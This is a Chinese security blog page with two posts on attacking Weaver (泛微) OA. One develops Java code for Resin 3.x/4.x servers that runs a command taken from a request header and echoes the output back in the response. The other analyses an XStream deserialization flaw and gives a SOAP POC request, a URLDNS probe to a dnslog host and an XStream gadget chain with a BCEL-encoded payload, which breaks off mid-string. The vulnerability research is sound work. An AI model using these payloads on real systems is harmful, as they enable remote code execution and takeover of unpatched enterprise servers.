<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524161550917.png" alt="image-20210524161550917"></p>
<p>​        经过一番搜索，只有下面的两个方法会返回ProtocolConnection对象。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524163202219.png" alt="image-20210524163202219"></p>
<p>​            先看看<code>com.caucho.ejb.util.EjbUtil#createRequestContext</code>方法，这个方法要返回ProtocolConnection的条件是需要user的内容不为Null,但实际上我通过反射调用该方法user为Null，因此不会返回ProtocolConnection对象。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524163936899.png" alt="image-20210524163936899"></p>
<p>​        所以只能通过<code>com.caucho.network.listen.TcpSocketLink#getCurrentRequest</code>来获取该对象，从<code>_currentRequest</code>获取对象，并且<code>_currentRequest</code>也是static类型的，所以可以通过反射拿到。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524164120690.png" alt="image-20210524164120690"></p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524164155683.png" alt="image-20210524164155683"></p>
<p>​    但是获取的<code>ProtocolConnection</code>对象实际类型是否是我们想要的<code>AbstractHttpRequest</code>类型呢?可以尝试获取下。可以看到实际上获取的是HttpRequest对象。而HttpRequest对象是我们想要的<code>AbstractHttpRequest</code>的子类，所以是可以满足我们的要求的。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524165013268.png" alt="image-20210524165013268"></p>
<p>​        最后梳理一下Resin 4.x获取回显的思路。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 通过调用TcpSocketLink.getCurrentRequest()获取ProtocolConnection对象。</span><br><span class="line">2. 通过调用getResponseFacade方法获取response对象。</span><br><span class="line">3. 通过反射调用reponse对象的getWriter方法获取PrintWriter对象。</span><br><span class="line">4. 通过PrintWriter对象的write方法写入回显内容。</span><br></pre></td></tr></table></figure>

<h2 id="Resin-3-x获取命令执行结果"><a href="#Resin-3-x获取命令执行结果" class="headerlink" title="Resin 3.x获取命令执行结果"></a><strong>Resin 3.x获取命令执行结果</strong></h2><p>​        虽然上面的回显方案可以解决大部分问题，但是我本地搭建的泛微OA V8.0却不能使用上面的方案，经过分析在Resin 3.X系统中并没有<code>com.caucho.network.listen.TcpSocketLink</code>。和上面的思路类似，我们先看看在正常的使用中，系统是如何获取Response对象的。执行任意一个请求并打断点，可以看到并不是通过TcpSocketLink类到Request请求的。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524171146487.png" alt="image-20210524171146487"></p>
<p>​        在<code>com.caucho.server.connection.AbstractHttpRequest</code>中可以获取response对象。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192646646.png" alt="image-20210524192646646"></p>
<p>​        同理，查看类的继承结构，可以通过获取ServletRequest间接获取AbstractHttpRequest对象。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192734916.png" alt="image-20210524192734916"></p>
<p>​    经过搜索可以在<code>com.caucho.server.dispatch.ServletInvocation#getContextRequest</code>中拿到ServletRequest对象。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192932012.png" alt="image-20210524192932012"></p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192952083.png" alt="image-20210524192952083"></p>
<p>​        测试代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object currentRequest =Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>).getMethod(<span class="string">"getContextRequest"</span>).invoke((Object)<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524193143325.png" alt="image-20210524193143325"></p>
<p>​    获取到ServletRequest对象后，通过_response字段的内容获取到response对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">"_response"</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>); </span><br><span class="line">Object response = f.get(currentRequest);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524193905979.png" alt="image-20210524193905979"></p>
<p>​        获取Writer并执行写入操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method getWriterM = response.getClass().getMethod(<span class="string">"getWriter"</span>); </span><br><span class="line">Writer w = (Writer)getWriterM.invoke(response);</span><br><span class="line">w.write(<span class="string">"test666"</span>);</span><br></pre></td></tr></table></figure>

<p>​        整体的代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object currentRequest =Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>).getMethod(<span class="string">"getContextRequest"</span>).invoke((Object)<span class="keyword">null</span>);</span><br><span class="line">Field f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">"_response"</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>); </span><br><span class="line">Object response = f.get(currentRequest);</span><br><span class="line">Method getWriterM = response.getClass().getMethod(<span class="string">"getWriter"</span>); </span><br><span class="line">Writer w = (Writer)getWriterM.invoke(response);</span><br><span class="line">w.write(<span class="string">"test666"</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525094741508.png" alt="image-20210525094741508"></p>
<h2 id="通用回显"><a href="#通用回显" class="headerlink" title="通用回显"></a>通用回显</h2><p>​        在Resin 4.X中查看是否可以通过getContextRequest获取request对象，通过<code>TcpSocketLink.getCurrentRequest()</code>获取ProtocolConnection对象并返回，也就是说在Resin 4.X中也可以通过ServletInvocation的getContextRequest方法获取回显。通过ServletInvocation获取request对象是版本兼容的。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525095734484.png" alt="image-20210525095734484"></p>
<p>​        虽然在 Resin 3.x和4.x都获取了request对象，但实际上获取的request对象的实际类型是不同的。</p>
<p><strong>Resin 3.x</strong></p>
<p>​        在resin 3.x中获取的类型是HttpRequest对象，HttpRequest类中并没有保存_response对象，需要从父类AbstractHttpRequest中获取。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111526652.png" alt="image-20210525111526652"></p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111704916.png" alt="image-20210525111704916"></p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111926125.png" alt="image-20210525111926125"></p>
<p>​        通过上面的分析在resin 3.x中获取response对象需要使用下面的代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>).getMethod(<span class="string">"getContextRequest"</span>).invoke((Object)<span class="keyword">null</span>).getClass().getSuperclass().getDeclaredField(<span class="string">"_response"</span>)</span><br></pre></td></tr></table></figure>

<p><strong>Resin 4.x</strong></p>
<p>在Resin 4中获取的实际类型是HttpServletRequestImpl类型。HttpServletRequestImpl中直接保存了_response对象，所以可以用HttpServletRequestImpl的类加载器直接获取response对象。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111156669.png" alt="image-20210525111156669"></p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111305609.png" alt="image-20210525111305609"></p>
<p>​        在resin 4.x中使用下面的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>).getMethod(<span class="string">"getContextRequest"</span>).invoke((Object)<span class="keyword">null</span>).getClass().getDeclaredField(<span class="string">"_response"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525112344783.png" alt="image-20210525112344783"></p>
<p><strong>代码整合</strong></p>
<p>​        通过上面的分析，可以通过判断获取的request对象的类型来判断resin的版本，再根据版本的不同选择不同微调代码进行回显利用。根据获取request对象的不同，通过不同的方式获取response对象。下面是从请求头获取命令执行并回显的代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            Field f;</span><br><span class="line">           Object currentRequest =Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>).getMethod(<span class="string">"getContextRequest"</span>).invoke((Object)<span class="keyword">null</span>);</span><br><span class="line">           Class&lt;?&gt; c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.server.http.HttpRequest"</span>);</span><br><span class="line">           <span class="keyword">if</span>(c.isInstance(currentRequest))&#123;</span><br><span class="line">               f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">"_response"</span>);</span><br><span class="line"></span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               f = currentRequest.getClass().getDeclaredField(<span class="string">"_response"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object response = f.get(currentRequest);</span><br><span class="line">            Method getWriterM = response.getClass().getMethod(<span class="string">"getWriter"</span>);</span><br><span class="line">            Writer w = (Writer)getWriterM.invoke(response);</span><br><span class="line">            Method getHeaderM = currentRequest.getClass().getMethod(<span class="string">"getHeader"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            String cmd = (String)getHeaderM.invoke(currentRequest, <span class="string">"sectest666"</span>);</span><br><span class="line">            Scanner s = (<span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">            w.write(s.hasNext() ? s.next() : <span class="string">""</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException | IOException | IllegalAccessException | ClassNotFoundException | NoSuchFieldException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">泛微Xstream反序列化漏洞分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-05-15 16:58:33 / Modified: 17:00:08" itemprop="dateCreated datePublished" datetime="2021-05-15T16:58:33+08:00">2021-05-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞分析</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="泛微Xstream反序列化漏洞分析"><a href="#泛微Xstream反序列化漏洞分析" class="headerlink" title="泛微Xstream反序列化漏洞分析"></a>泛微Xstream反序列化漏洞分析</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​        POC大致如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;services%20&#x2F;WorkflowServiceXml HTTP&#x2F;1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text&#x2F;xml;charset&#x3D;UTF-8</span><br><span class="line">SOAPAction: &quot;&quot;</span><br><span class="line">Content-Length: 33003</span><br><span class="line">Host: : 192.168.190.128</span><br><span class="line">User-Agent: Apache-HttpClient&#x2F;4.1.1 (java 1.5)</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:web&#x3D;&quot;webservices.services.weaver.com.cn&quot;&gt;</span><br><span class="line">   &lt;soapenv:Header&#x2F;&gt;</span><br><span class="line">   &lt;soapenv:Body&gt;</span><br><span class="line">      &lt;web:doCreateWorkflowRequest&gt;    &lt;web:string&gt;</span><br></pre></td></tr></table></figure>

<p>​        根据作者提供的POC可以知道作者访问了webservice的接口，这类请求会交给XFireConfigurableServlet进行处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services&#x2F;WorkflowServiceXml</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210506101625126.png" alt="image-20210506101625126"></p>
<p>​        查看了xfire组件的使用案例，在service.xml中会配置service的接口和实现类。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210506102856979.png" alt="image-20210506102856979"></p>
<p>​        想要查看某个接口的调用方式也比较简单，直接访问services目录，可以看到所有的service接口。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210506103010562.png" alt="image-20210506103010562"></p>
<p>​            再利用wsdler解析我们需要的数据包。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210506103300724.png" alt="image-20210506103300724"></p>
<p>​        请求后会交给<code>weaver.workflow.webservices.WorkflowServiceImplXml#doCreateWorkflowRequest</code>进行处理，将我们传入的var1参数通过xmlToObject进行解析。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210506103453888.png" alt="image-20210506103453888"></p>
<p>​        最终会通过xstream进行解析，我目前使用的是泛微8.0,对应的xstream的版本为1.3,并不是最新的版本，因此存在反序列化漏洞。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210506103537356.png" alt="image-20210506103537356"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>​        由于我们传入的内容会被当作一个参数传入，特殊字符会对原本的xml请求解析造成影响，因此需要进行html编码。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210513181322092.png" alt="image-20210513181322092"></p>
<h4 id="使用URLDNS进行探测"><a href="#使用URLDNS进行探测" class="headerlink" title="使用URLDNS进行探测"></a><strong>使用URLDNS进行探测</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;url&gt;http:&#x2F;&#x2F;1xsz12.dnslog.cn&lt;&#x2F;url&gt;</span><br><span class="line">    &lt;string&gt;http:&#x2F;&#x2F;1xsz12.dnslog.cn&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210513181159174.png" alt="image-20210513181159174"></p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization&#x3D;&#39;custom&#39;&gt;</span><br><span class="line">  &lt;unserializable-parents&#x2F;&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;&#x2F;size&gt;</span><br><span class="line">      &lt;comparator class&#x3D;&#39;javafx.collections.ObservableList$1&#39;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;&#x2F;int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class&#x3D;&#39;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#39;&gt;</span><br><span class="line">          &lt;contentType&gt;text&#x2F;plain&lt;&#x2F;contentType&gt;</span><br><span class="line">          &lt;is class&#x3D;&#39;java.io.SequenceInputStream&#39;&gt;</span><br><span class="line">            &lt;e class&#x3D;&#39;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#39;&gt;</span><br><span class="line">              &lt;iterator class&#x3D;&#39;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#39;&gt;</span><br><span class="line">                &lt;names class&#x3D;&#39;java.util.AbstractList$Itr&#39;&gt;</span><br><span class="line">                  &lt;cursor&gt;0&lt;&#x2F;cursor&gt;</span><br><span class="line">                  &lt;lastRet&gt;-1&lt;&#x2F;lastRet&gt;</span><br><span class="line">                  &lt;expectedModCount&gt;0&lt;&#x2F;expectedModCount&gt;</span><br><span class="line">                  &lt;outer-class class&#x3D;&#39;java.util.Arrays$ArrayList&#39;&gt;</span><br><span class="line">                    &lt;a class&#x3D;&#39;string-array&#39;&gt;</span><br><span class="line">                      &lt;string&gt;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$d9W$TW$i$fe$G$C3$M$c3b$Qa$5c$b1u$J$w$c1$ee$V$a9$VA$5c$g$d0$g$8a$Vm$ed0$5c$60$m$cc$c4$c9D$90$$v$b3$9b$ddwk$b7$97$k_$db$3eDO$7b$da$d3$87$be$d8S$l$da$3f$a8$f6$bb$93$40$J$89$da$9c$93$7b$e7$fe$eeo$bb$bf$ef$bb$bf$99$3f$fe$f9$e9W$A$f7$e3$5b$j$G$S$3a$G0$a8$e1$88$9c$8f$eax$i$c7$e4$90$d40$a4$e3$J$Mk8$ae$e2I$j$3aN$a8$Y$d1q$S$a7$a4$d9SR$f2$b4$86$d3r$7eF$87$85Q9$d8$g$c6T$I$N$e3$3a$9a1$a1aR$85$a3aJ$c5$b4$8e$Uft$ac$81$ab$c1$93sZ$Og$e4$e0k$c8$a8$It$dc$8d$ac$8a$b3$K$aa$bb$j$d7$J$f6$u$a8$8c$b5$P$x$88$f4zcBAC$c2q$c5$60vfT$f8C$d6h$8a$92h$c2$b3$ad$d4$b0$e5$3br$bd$m$M$ect$c6$b3$a7E$40$fd$e9$de$945$3f$af$60Eb$ca$3aku$a6$yw$a2$93$a2Lf7$V$tD$d0$9b$f5$7d$e1$G$c7$c4$99$ac$c8$E$D$KV$_Q$f4$c5xJ$d8A$e7$80$I$s$bd1Z$d4$dbE$ea2$81$ff$b4$8f$8cNQ$99Z$ca$b8$C$b3$8c$9b$7eG$a4$a4$X$cd$X$99$b4$e7f$98$ab$ce$U$8e$fbN$m$7c$86Vf$V4$e6$ed$i$af3$_$de$9d$d79$u$ac$b1P$a7$d2$9e$Z$x$O$9b$M$7c$c7$9d$90a3$K$9a$f2$h$d9$c0Iu$sm$cbuC$P$K$p5$_1$d9$3fg$8bt$e0x$$$f7$o$c1$a4C$c3$9a$c4x$d6$9e$3e$e7e$v$aaK$G$96$3d$3d$60$a5$c3$82$S$Q$S$40$c5$y$e1W1Gt$J$v$f1$q$60$cc$z$e9e$7d$5b$f4$3b$b2$f0F$c1E$5cF2$b0$F$5bU$9c30$8fg$Z$868$d9$G$9e$c3$f3$w$5e0p$k$_$gx$J$_$x$d8j$7b3q$db$ca$da$93$5e$dc$V$c1$ac$e7O$c7SN$s$Qn$7c$c8N$t$XqT$f1$8a$81Wq$81P$96$c0Fj$yC$d7$c0kx$9d$d5$5c$8e$O$8fa$e0$N$bci$e0$z$5c4$f06$$$d2$f6$f4$C$k$fd$96$cd2$hx$H$ef$f2$a4$G$de$c3$fb$G$3e$c0$87$y$cf$oN$qA1B$KbioV$f8b$acm$f4$5c$5b$da$L$ac$m$e3$b5$95$fd$Z$f8$I$l$e7$9d$e5$B$z$ca0$P$a4$C5$efc$tOZ$C$a6$8aO$M$7c$8a$cfdu$3fWPq$aa$c7$c0$r$7ca$e02$be4$f0$V$beV$A$b2$a0$M$d4$G$be$c1V$3a$_$60$a4$a0$f5V$3cW$d0r$L$ee$$d$U$ee$i$cb$ba$813S$e0$f0$e2$a29$d6$9e$u$d1$914$Ts$c2$s$da$b1R$e6$$58$ea$7b$b6$I$_$e7$92$c2$MM$fa$ac$WyY$b8$7d$L$eb$95E$b1$f2RZ6K$7exn$m$e6$82$90$L$J$__j$b3H$7d$c9$96$b4$v$bbA$a8R$7c$I$r$K6$df$n$f7$85$b6$o$e1$5d$a8$e4$de26$tKl$dao$d7s$aa$j$f7$ac7$cd$d2$ee$8a$956$9b$93$a5$a2$f6r$zI$935$c9$l$a3$a9$b4$M$f2$ceS$n$99M$L$df$cek5r$dd$t$b8$m$af$L$d8w$dc$e1$fc$cb$db$5c$5dF$E$3d$b6$84$d3$J$fbr$q6$o$9by$r$3d$x$d8R$e60e3$af$9a$95$b7L$S$abL$f4$e1$oF$W$c8$c3$h$ca$Q$87$dct6$a0$9e$b0fH$e8$853$f3$d6$$$d9$a0$fb$d6X$d9$N$e9$d9$c8fD$9fH93$f9$5b$7e$h$ea$$k$b7$ea$a4$95$Z$q$fb$c2$d7$d7$I$P$ee$86$8bb$ba$$$b6$ed$864$l$82$b0$e5$O$f9$96$z$b0$R$9b$f9$82$95$3fvn$d9E9$c6$80$8avT$a3$96$d2$bf$b7$5d$85r$N$V$d1$ca$i$o$c7$af$a1$w$87$ea$a8$9a$83$96$d8$k$ad$a9$fc$Fz$O$b5$D$3b$U$3e$Z9$d4$Nv$e4P$9fCC$b41$87$V$5d$R3$S$c9$njF$um$ea$aa2i$5b$l$5dY0$ea$aa6$ab$cd$aa$82$ddoh$eeRM5$ba$w$87$W$e9$o$da$g$a1$d6$89$ca$a8$99$